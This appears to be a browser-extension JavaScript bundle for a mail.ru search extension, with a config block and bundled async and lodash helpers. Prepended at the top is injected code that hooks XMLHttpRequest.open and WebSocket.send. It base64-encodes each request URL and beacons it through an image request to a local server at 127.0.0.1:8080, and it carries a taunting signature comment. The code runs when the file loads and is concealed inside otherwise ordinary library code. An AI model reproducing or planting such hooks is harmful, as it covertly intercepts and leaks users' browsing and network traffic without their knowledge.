function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s})({1:[function(require,module,exports){
module.exports={
  "shortTermCookie": {
    "url": "https://inline.go.mail.ru",
    "name": "go_install_data_dse"
  },
  "longTermCookie": {
    "url": "https://inline.go.mail.ru",
    "name": "go_req_data_dse"
  },
  "localStorage": {
    "key": "ru.mail.dse.ext_info"
  },
  "nativeMessaging": {
    "host": "ru.mail.go.ext_info_host"
  },
  "uninstall": {
    "url": "https://data.amigo.mail.ru/newtab/uninstall.html"
  },
  "metrics": {
    "mrds": {
      "url": "http://mrds.mail.ru/update/2/version.txt",
      "parameters": {}
    },
    "go": {
      "url": "http://go.mail.ru/distib/mark/",
      "parameters": {}
    },
    "partnerInstall": {
      "parameters": {}
    }
  },
  "rbTargeting": {
    "url": "https://ad.mail.ru/i1556.gif"
  },
  "extensionData": {
    "comp": "dse",
    "product_type": "ch_xtndse"
  }
}

},{}],2:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _eachLimit = require('./eachLimit');

var _eachLimit2 = _interopRequireDefault(_eachLimit);

var _doLimit = require('./internal/doLimit');

var _doLimit2 = _interopRequireDefault(_doLimit);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.default = (0, _doLimit2.default)(_eachLimit2.default, Infinity);

},{"./eachLimit":3,"./internal/doLimit":4}],3:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = eachLimit;

var _eachOfLimit = require('./internal/eachOfLimit');

var _eachOfLimit2 = _interopRequireDefault(_eachOfLimit);

var _withoutIndex = require('./internal/withoutIndex');

var _withoutIndex2 = _interopRequireDefault(_withoutIndex);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function eachLimit(arr, limit, iteratee, cb) {
    return (0, _eachOfLimit2.default)(limit)(arr, (0, _withoutIndex2.default)(iteratee), cb);
}

},{"./internal/eachOfLimit":5,"./internal/withoutIndex":10}],4:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = doLimit;
function doLimit(fn, limit) {
    return function (iterable, iteratee, callback) {
        return fn(iterable, limit, iteratee, callback);
    };
}

},{}],5:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = _eachOfLimit;

var _noop = require('lodash-es/noop');

var _noop2 = _interopRequireDefault(_noop);

var _once = require('./once');

var _once2 = _interopRequireDefault(_once);

var _iterator = require('./iterator');

var _iterator2 = _interopRequireDefault(_iterator);

var _onlyOnce = require('./onlyOnce');

var _onlyOnce2 = _interopRequireDefault(_onlyOnce);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _eachOfLimit(limit) {
    return function (obj, iteratee, callback) {
        callback = (0, _once2.default)(callback || _noop2.default);
        obj = obj || [];
        var nextElem = (0, _iterator2.default)(obj);
        if (limit <= 0) {
            return callback(null);
        }
        var done = false;
        var running = 0;
        var errored = false;

        (function replenish() {
            if (done && running <= 0) {
                return callback(null);
            }

            while (running < limit && !errored) {
                var elem = nextElem();
                if (elem === null) {
                    done = true;
                    if (running <= 0) {
                        callback(null);
                    }
                    return;
                }
                running += 1;
                iteratee(elem.value, elem.key, (0, _onlyOnce2.default)(function (err) {
                    running -= 1;
                    if (err) {
                        callback(err);
                        errored = true;
                    } else {
                        replenish();
                    }
                }));
            }
        })();
    };
}

},{"./iterator":7,"./once":8,"./onlyOnce":9,"lodash-es/noop":32}],6:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});

exports.default = function (coll) {
    return iteratorSymbol && coll[iteratorSymbol] && coll[iteratorSymbol]();
};

var iteratorSymbol = typeof Symbol === 'function' && Symbol.iterator;

},{}],7:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = iterator;

var _isArrayLike = require('lodash-es/isArrayLike');

var _isArrayLike2 = _interopRequireDefault(_isArrayLike);

var _getIterator = require('./getIterator');

var _getIterator2 = _interopRequireDefault(_getIterator);

var _keys = require('lodash-es/keys');

var _keys2 = _interopRequireDefault(_keys);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function iterator(coll) {
    var i = -1;
    var len;
    if ((0, _isArrayLike2.default)(coll)) {
        len = coll.length;
        return function next() {
            i++;
            return i < len ? { value: coll[i], key: i } : null;
        };
    }

    var iterate = (0, _getIterator2.default)(coll);
    if (iterate) {
        return function next() {
            var item = iterate.next();
            if (item.done) return null;
            i++;
            return { value: item.value, key: i };
        };
    }

    var okeys = (0, _keys2.default)(coll);
    len = okeys.length;
    return function next() {
        i++;
        var key = okeys[i];
        return i < len ? { value: coll[key], key: key } : null;
    };
}

},{"./getIterator":6,"lodash-es/isArrayLike":23,"lodash-es/keys":31}],8:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = once;
function once(fn) {
    return function () {
        if (fn === null) return;
        fn.apply(this, arguments);
        fn = null;
    };
}

},{}],9:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = onlyOnce;
function onlyOnce(fn) {
    return function () {
        if (fn === null) throw new Error("Callback was already called.");
        fn.apply(this, arguments);
        fn = null;
    };
}

},{}],10:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = _withoutIndex;
function _withoutIndex(iteratee) {
    return function (value, index, callback) {
        return iteratee(value, callback);
    };
}

},{}],11:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
/**
 * A faster alternative to `Function#apply`, this function invokes `func`
 * with the `this` binding of `thisArg` and the arguments of `args`.
 *
 * @private
 * @param {Function} func The function to invoke.
 * @param {*} thisArg The `this` binding of `func`.
 * @param {Array} args The arguments to invoke `func` with.
 * @returns {*} Returns the result of `func`.
 */
function apply(func, thisArg, args) {
  var length = args.length;
  switch (length) {
    case 0:
      return func.call(thisArg);
    case 1:
      return func.call(thisArg, args[0]);
    case 2:
      return func.call(thisArg, args[0], args[1]);
    case 3:
      return func.call(thisArg, args[0], args[1], args[2]);
  }
  return func.apply(thisArg, args);
}

exports.default = apply;

},{}],12:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

var _getPrototype = require('./_getPrototype');

var _getPrototype2 = _interopRequireDefault(_getPrototype);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** Used for built-in method references. */
var objectProto = Object.prototype;

/** Used to check objects for own properties. */
var hasOwnProperty = objectProto.hasOwnProperty;

/**
 * The base implementation of `_.has` without support for deep paths.
 *
 * @private
 * @param {Object} object The object to query.
 * @param {Array|string} key The key to check.
 * @returns {boolean} Returns `true` if `key` exists, else `false`.
 */
function baseHas(object, key) {
  // Avoid a bug in IE 10-11 where objects with a [[Prototype]] of `null`,
  // that are composed entirely of index properties, return `false` for
  // `hasOwnProperty` checks of them.
  return hasOwnProperty.call(object, key) || (typeof object === 'undefined' ? 'undefined' : _typeof(object)) == 'object' && key in object && (0, _getPrototype2.default)(object) === null;
}

exports.default = baseHas;

},{"./_getPrototype":17}],13:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
/* Built-in method references for those with the same name as other `lodash` methods. */
var nativeKeys = Object.keys;

/**
 * The base implementation of `_.keys` which doesn't skip the constructor
 * property of prototypes or treat sparse arrays as dense.
 *
 * @private
 * @param {Object} object The object to query.
 * @returns {Array} Returns the array of property names.
 */
function baseKeys(object) {
  return nativeKeys(Object(object));
}

exports.default = baseKeys;

},{}],14:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
/**
 * The base implementation of `_.property` without support for deep paths.
 *
 * @private
 * @param {string} key The key of the property to get.
 * @returns {Function} Returns the new function.
 */
function baseProperty(key) {
  return function (object) {
    return object == null ? undefined : object[key];
  };
}

exports.default = baseProperty;

},{}],15:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
/**
 * The base implementation of `_.times` without support for iteratee shorthands
 * or max array length checks.
 *
 * @private
 * @param {number} n The number of times to invoke `iteratee`.
 * @param {Function} iteratee The function invoked per iteration.
 * @returns {Array} Returns the array of results.
 */
function baseTimes(n, iteratee) {
  var index = -1,
      result = Array(n);

  while (++index < n) {
    result[index] = iteratee(index);
  }
  return result;
}

exports.default = baseTimes;

},{}],16:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _baseProperty = require('./_baseProperty');

var _baseProperty2 = _interopRequireDefault(_baseProperty);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/**
 * Gets the "length" property value of `object`.
 *
 * **Note:** This function is used to avoid a
 * [JIT bug](https://bugs.webkit.org/show_bug.cgi?id=142792) that affects
 * Safari on at least iOS 8.1-8.3 ARM64.
 *
 * @private
 * @param {Object} object The object to query.
 * @returns {*} Returns the "length" value.
 */
var getLength = (0, _baseProperty2.default)('length');

exports.default = getLength;

},{"./_baseProperty":14}],17:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
/* Built-in method references for those with the same name as other `lodash` methods. */
var nativeGetPrototype = Object.getPrototypeOf;

/**
 * Gets the `[[Prototype]]` of `value`.
 *
 * @private
 * @param {*} value The value to query.
 * @returns {null|Object} Returns the `[[Prototype]]`.
 */
function getPrototype(value) {
  return nativeGetPrototype(Object(value));
}

exports.default = getPrototype;

},{}],18:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _baseTimes = require('./_baseTimes');

var _baseTimes2 = _interopRequireDefault(_baseTimes);

var _isArguments = require('./isArguments');

var _isArguments2 = _interopRequireDefault(_isArguments);

var _isArray = require('./isArray');

var _isArray2 = _interopRequireDefault(_isArray);

var _isLength = require('./isLength');

var _isLength2 = _interopRequireDefault(_isLength);

var _isString = require('./isString');

var _isString2 = _interopRequireDefault(_isString);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/**
 * Creates an array of index keys for `object` values of arrays,
 * `arguments` objects, and strings, otherwise `null` is returned.
 *
 * @private
 * @param {Object} object The object to query.
 * @returns {Array|null} Returns index keys, else `null`.
 */
function indexKeys(object) {
  var length = object ? object.length : undefined;
  if ((0, _isLength2.default)(length) && ((0, _isArray2.default)(object) || (0, _isString2.default)(object) || (0, _isArguments2.default)(object))) {
    return (0, _baseTimes2.default)(length, String);
  }
  return null;
}

exports.default = indexKeys;

},{"./_baseTimes":15,"./isArguments":21,"./isArray":22,"./isLength":26,"./isString":29}],19:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
/** Used as references for various `Number` constants. */
var MAX_SAFE_INTEGER = 9007199254740991;

/** Used to detect unsigned integer values. */
var reIsUint = /^(?:0|[1-9]\d*)$/;

/**
 * Checks if `value` is a valid array-like index.
 *
 * @private
 * @param {*} value The value to check.
 * @param {number} [length=MAX_SAFE_INTEGER] The upper bounds of a valid index.
 * @returns {boolean} Returns `true` if `value` is a valid index, else `false`.
 */
function isIndex(value, length) {
  value = typeof value == 'number' || reIsUint.test(value) ? +value : -1;
  length = length == null ? MAX_SAFE_INTEGER : length;
  return value > -1 && value % 1 == 0 && value < length;
}

exports.default = isIndex;

},{}],20:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
/** Used for built-in method references. */
var objectProto = Object.prototype;

/**
 * Checks if `value` is likely a prototype object.
 *
 * @private
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is a prototype, else `false`.
 */
function isPrototype(value) {
  var Ctor = value && value.constructor,
      proto = typeof Ctor == 'function' && Ctor.prototype || objectProto;

  return value === proto;
}

exports.default = isPrototype;

},{}],21:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _isArrayLikeObject = require('./isArrayLikeObject');

var _isArrayLikeObject2 = _interopRequireDefault(_isArrayLikeObject);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** `Object#toString` result references. */
var argsTag = '[object Arguments]';

/** Used for built-in method references. */
var objectProto = Object.prototype;

/** Used to check objects for own properties. */
var hasOwnProperty = objectProto.hasOwnProperty;

/**
 * Used to resolve the
 * [`toStringTag`](http://ecma-international.org/ecma-262/6.0/#sec-object.prototype.tostring)
 * of values.
 */
var objectToString = objectProto.toString;

/** Built-in value references. */
var propertyIsEnumerable = objectProto.propertyIsEnumerable;

/**
 * Checks if `value` is likely an `arguments` object.
 *
 * @static
 * @memberOf _
 * @since 0.1.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is correctly classified,
 *  else `false`.
 * @example
 *
 * _.isArguments(function() { return arguments; }());
 * // => true
 *
 * _.isArguments([1, 2, 3]);
 * // => false
 */
function isArguments(value) {
  // Safari 8.1 incorrectly makes `arguments.callee` enumerable in strict mode.
  return (0, _isArrayLikeObject2.default)(value) && hasOwnProperty.call(value, 'callee') && (!propertyIsEnumerable.call(value, 'callee') || objectToString.call(value) == argsTag);
}

exports.default = isArguments;

},{"./isArrayLikeObject":24}],22:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
/**
 * Checks if `value` is classified as an `Array` object.
 *
 * @static
 * @memberOf _
 * @since 0.1.0
 * @type {Function}
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is correctly classified,
 *  else `false`.
 * @example
 *
 * _.isArray([1, 2, 3]);
 * // => true
 *
 * _.isArray(document.body.children);
 * // => false
 *
 * _.isArray('abc');
 * // => false
 *
 * _.isArray(_.noop);
 * // => false
 */
var isArray = Array.isArray;

exports.default = isArray;

},{}],23:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _getLength = require('./_getLength');

var _getLength2 = _interopRequireDefault(_getLength);

var _isFunction = require('./isFunction');

var _isFunction2 = _interopRequireDefault(_isFunction);

var _isLength = require('./isLength');

var _isLength2 = _interopRequireDefault(_isLength);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/**
 * Checks if `value` is array-like. A value is considered array-like if it's
 * not a function and has a `value.length` that's an integer greater than or
 * equal to `0` and less than or equal to `Number.MAX_SAFE_INTEGER`.
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is array-like, else `false`.
 * @example
 *
 * _.isArrayLike([1, 2, 3]);
 * // => true
 *
 * _.isArrayLike(document.body.children);
 * // => true
 *
 * _.isArrayLike('abc');
 * // => true
 *
 * _.isArrayLike(_.noop);
 * // => false
 */
function isArrayLike(value) {
  return value != null && (0, _isLength2.default)((0, _getLength2.default)(value)) && !(0, _isFunction2.default)(value);
}

exports.default = isArrayLike;

},{"./_getLength":16,"./isFunction":25,"./isLength":26}],24:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _isArrayLike = require('./isArrayLike');

var _isArrayLike2 = _interopRequireDefault(_isArrayLike);

var _isObjectLike = require('./isObjectLike');

var _isObjectLike2 = _interopRequireDefault(_isObjectLike);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/**
 * This method is like `_.isArrayLike` except that it also checks if `value`
 * is an object.
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is an array-like object,
 *  else `false`.
 * @example
 *
 * _.isArrayLikeObject([1, 2, 3]);
 * // => true
 *
 * _.isArrayLikeObject(document.body.children);
 * // => true
 *
 * _.isArrayLikeObject('abc');
 * // => false
 *
 * _.isArrayLikeObject(_.noop);
 * // => false
 */
function isArrayLikeObject(value) {
  return (0, _isObjectLike2.default)(value) && (0, _isArrayLike2.default)(value);
}

exports.default = isArrayLikeObject;

},{"./isArrayLike":23,"./isObjectLike":28}],25:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _isObject = require('./isObject');

var _isObject2 = _interopRequireDefault(_isObject);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** `Object#toString` result references. */
var funcTag = '[object Function]',
    genTag = '[object GeneratorFunction]';

/** Used for built-in method references. */
var objectProto = Object.prototype;

/**
 * Used to resolve the
 * [`toStringTag`](http://ecma-international.org/ecma-262/6.0/#sec-object.prototype.tostring)
 * of values.
 */
var objectToString = objectProto.toString;

/**
 * Checks if `value` is classified as a `Function` object.
 *
 * @static
 * @memberOf _
 * @since 0.1.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is correctly classified,
 *  else `false`.
 * @example
 *
 * _.isFunction(_);
 * // => true
 *
 * _.isFunction(/abc/);
 * // => false
 */
function isFunction(value) {
  // The use of `Object#toString` avoids issues with the `typeof` operator
  // in Safari 8 which returns 'object' for typed array and weak map constructors,
  // and PhantomJS 1.9 which returns 'function' for `NodeList` instances.
  var tag = (0, _isObject2.default)(value) ? objectToString.call(value) : '';
  return tag == funcTag || tag == genTag;
}

exports.default = isFunction;

},{"./isObject":27}],26:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
/** Used as references for various `Number` constants. */
var MAX_SAFE_INTEGER = 9007199254740991;

/**
 * Checks if `value` is a valid array-like length.
 *
 * **Note:** This function is loosely based on
 * [`ToLength`](http://ecma-international.org/ecma-262/6.0/#sec-tolength).
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is a valid length,
 *  else `false`.
 * @example
 *
 * _.isLength(3);
 * // => true
 *
 * _.isLength(Number.MIN_VALUE);
 * // => false
 *
 * _.isLength(Infinity);
 * // => false
 *
 * _.isLength('3');
 * // => false
 */
function isLength(value) {
  return typeof value == 'number' && value > -1 && value % 1 == 0 && value <= MAX_SAFE_INTEGER;
}

exports.default = isLength;

},{}],27:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

/**
 * Checks if `value` is the
 * [language type](http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-language-types)
 * of `Object`. (e.g. arrays, functions, objects, regexes, `new Number(0)`, and `new String('')`)
 *
 * @static
 * @memberOf _
 * @since 0.1.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is an object, else `false`.
 * @example
 *
 * _.isObject({});
 * // => true
 *
 * _.isObject([1, 2, 3]);
 * // => true
 *
 * _.isObject(_.noop);
 * // => true
 *
 * _.isObject(null);
 * // => false
 */
function isObject(value) {
  var type = typeof value === 'undefined' ? 'undefined' : _typeof(value);
  return !!value && (type == 'object' || type == 'function');
}

exports.default = isObject;

},{}],28:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

/**
 * Checks if `value` is object-like. A value is object-like if it's not `null`
 * and has a `typeof` result of "object".
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is object-like, else `false`.
 * @example
 *
 * _.isObjectLike({});
 * // => true
 *
 * _.isObjectLike([1, 2, 3]);
 * // => true
 *
 * _.isObjectLike(_.noop);
 * // => false
 *
 * _.isObjectLike(null);
 * // => false
 */
function isObjectLike(value) {
  return !!value && (typeof value === 'undefined' ? 'undefined' : _typeof(value)) == 'object';
}

exports.default = isObjectLike;

},{}],29:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _isArray = require('./isArray');

var _isArray2 = _interopRequireDefault(_isArray);

var _isObjectLike = require('./isObjectLike');

var _isObjectLike2 = _interopRequireDefault(_isObjectLike);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** `Object#toString` result references. */
var stringTag = '[object String]';

/** Used for built-in method references. */
var objectProto = Object.prototype;

/**
 * Used to resolve the
 * [`toStringTag`](http://ecma-international.org/ecma-262/6.0/#sec-object.prototype.tostring)
 * of values.
 */
var objectToString = objectProto.toString;

/**
 * Checks if `value` is classified as a `String` primitive or object.
 *
 * @static
 * @since 0.1.0
 * @memberOf _
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is correctly classified,
 *  else `false`.
 * @example
 *
 * _.isString('abc');
 * // => true
 *
 * _.isString(1);
 * // => false
 */
function isString(value) {
  return typeof value == 'string' || !(0, _isArray2.default)(value) && (0, _isObjectLike2.default)(value) && objectToString.call(value) == stringTag;
}

exports.default = isString;

},{"./isArray":22,"./isObjectLike":28}],30:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

var _isObjectLike = require('./isObjectLike');

var _isObjectLike2 = _interopRequireDefault(_isObjectLike);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** `Object#toString` result references. */
var symbolTag = '[object Symbol]';

/** Used for built-in method references. */
var objectProto = Object.prototype;

/**
 * Used to resolve the
 * [`toStringTag`](http://ecma-international.org/ecma-262/6.0/#sec-object.prototype.tostring)
 * of values.
 */
var objectToString = objectProto.toString;

/**
 * Checks if `value` is classified as a `Symbol` primitive or object.
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Lang
 * @param {*} value The value to check.
 * @returns {boolean} Returns `true` if `value` is correctly classified,
 *  else `false`.
 * @example
 *
 * _.isSymbol(Symbol.iterator);
 * // => true
 *
 * _.isSymbol('abc');
 * // => false
 */
function isSymbol(value) {
  return (typeof value === 'undefined' ? 'undefined' : _typeof(value)) == 'symbol' || (0, _isObjectLike2.default)(value) && objectToString.call(value) == symbolTag;
}

exports.default = isSymbol;

},{"./isObjectLike":28}],31:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _baseHas = require('./_baseHas');

var _baseHas2 = _interopRequireDefault(_baseHas);

var _baseKeys = require('./_baseKeys');

var _baseKeys2 = _interopRequireDefault(_baseKeys);

var _indexKeys = require('./_indexKeys');

var _indexKeys2 = _interopRequireDefault(_indexKeys);

var _isArrayLike = require('./isArrayLike');

var _isArrayLike2 = _interopRequireDefault(_isArrayLike);

var _isIndex = require('./_isIndex');

var _isIndex2 = _interopRequireDefault(_isIndex);

var _isPrototype = require('./_isPrototype');

var _isPrototype2 = _interopRequireDefault(_isPrototype);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/**
 * Creates an array of the own enumerable property names of `object`.
 *
 * **Note:** Non-object values are coerced to objects. See the
 * [ES spec](http://ecma-international.org/ecma-262/6.0/#sec-object.keys)
 * for more details.
 *
 * @static
 * @since 0.1.0
 * @memberOf _
 * @category Object
 * @param {Object} object The object to query.
 * @returns {Array} Returns the array of property names.
 * @example
 *
 * function Foo() {
 *   this.a = 1;
 *   this.b = 2;
 * }
 *
 * Foo.prototype.c = 3;
 *
 * _.keys(new Foo);
 * // => ['a', 'b'] (iteration order is not guaranteed)
 *
 * _.keys('hi');
 * // => ['0', '1']
 */
function keys(object) {
  var isProto = (0, _isPrototype2.default)(object);
  if (!(isProto || (0, _isArrayLike2.default)(object))) {
    return (0, _baseKeys2.default)(object);
  }
  var indexes = (0, _indexKeys2.default)(object),
      skipIndexes = !!indexes,
      result = indexes || [],
      length = result.length;

  for (var key in object) {
    if ((0, _baseHas2.default)(object, key) && !(skipIndexes && (key == 'length' || (0, _isIndex2.default)(key, length))) && !(isProto && key == 'constructor')) {
      result.push(key);
    }
  }
  return result;
}

exports.default = keys;

},{"./_baseHas":12,"./_baseKeys":13,"./_indexKeys":18,"./_isIndex":19,"./_isPrototype":20,"./isArrayLike":23}],32:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
/**
 * A no-operation function that returns `undefined` regardless of the
 * arguments it receives.
 *
 * @static
 * @memberOf _
 * @since 2.3.0
 * @category Util
 * @example
 *
 * var object = { 'user': 'fred' };
 *
 * _.noop(object) === undefined;
 * // => true
 */
function noop() {
  // No operation performed.
}

exports.default = noop;

},{}],33:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _apply = require('./_apply');

var _apply2 = _interopRequireDefault(_apply);

var _toInteger = require('./toInteger');

var _toInteger2 = _interopRequireDefault(_toInteger);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** Used as the `TypeError` message for "Functions" methods. */
var FUNC_ERROR_TEXT = 'Expected a function';

/* Built-in method references for those with the same name as other `lodash` methods. */
var nativeMax = Math.max;

/**
 * Creates a function that invokes `func` with the `this` binding of the
 * created function and arguments from `start` and beyond provided as
 * an array.
 *
 * **Note:** This method is based on the
 * [rest parameter](https://mdn.io/rest_parameters).
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Function
 * @param {Function} func The function to apply a rest parameter to.
 * @param {number} [start=func.length-1] The start position of the rest parameter.
 * @returns {Function} Returns the new function.
 * @example
 *
 * var say = _.rest(function(what, names) {
 *   return what + ' ' + _.initial(names).join(', ') +
 *     (_.size(names) > 1 ? ', & ' : '') + _.last(names);
 * });
 *
 * say('hello', 'fred', 'barney', 'pebbles');
 * // => 'hello fred, barney, & pebbles'
 */
function rest(func, start) {
  if (typeof func != 'function') {
    throw new TypeError(FUNC_ERROR_TEXT);
  }
  start = nativeMax(start === undefined ? func.length - 1 : (0, _toInteger2.default)(start), 0);
  return function () {
    var args = arguments,
        index = -1,
        length = nativeMax(args.length - start, 0),
        array = Array(length);

    while (++index < length) {
      array[index] = args[start + index];
    }
    switch (start) {
      case 0:
        return func.call(this, array);
      case 1:
        return func.call(this, args[0], array);
      case 2:
        return func.call(this, args[0], args[1], array);
    }
    var otherArgs = Array(start + 1);
    index = -1;
    while (++index < start) {
      otherArgs[index] = args[index];
    }
    otherArgs[start] = array;
    return (0, _apply2.default)(func, this, otherArgs);
  };
}

exports.default = rest;

},{"./_apply":11,"./toInteger":34}],34:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _toNumber = require('./toNumber');

var _toNumber2 = _interopRequireDefault(_toNumber);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** Used as references for various `Number` constants. */
var INFINITY = 1 / 0,
    MAX_INTEGER = 1.7976931348623157e+308;

/**
 * Converts `value` to an integer.
 *
 * **Note:** This function is loosely based on
 * [`ToInteger`](http://www.ecma-international.org/ecma-262/6.0/#sec-tointeger).
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Lang
 * @param {*} value The value to convert.
 * @returns {number} Returns the converted integer.
 * @example
 *
 * _.toInteger(3);
 * // => 3
 *
 * _.toInteger(Number.MIN_VALUE);
 * // => 0
 *
 * _.toInteger(Infinity);
 * // => 1.7976931348623157e+308
 *
 * _.toInteger('3');
 * // => 3
 */
function toInteger(value) {
  if (!value) {
    return value === 0 ? value : 0;
  }
  value = (0, _toNumber2.default)(value);
  if (value === INFINITY || value === -INFINITY) {
    var sign = value < 0 ? -1 : 1;
    return sign * MAX_INTEGER;
  }
  var remainder = value % 1;
  return value === value ? remainder ? value - remainder : value : 0;
}

exports.default = toInteger;

},{"./toNumber":35}],35:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _isFunction = require('./isFunction');

var _isFunction2 = _interopRequireDefault(_isFunction);

var _isObject = require('./isObject');

var _isObject2 = _interopRequireDefault(_isObject);

var _isSymbol = require('./isSymbol');

var _isSymbol2 = _interopRequireDefault(_isSymbol);

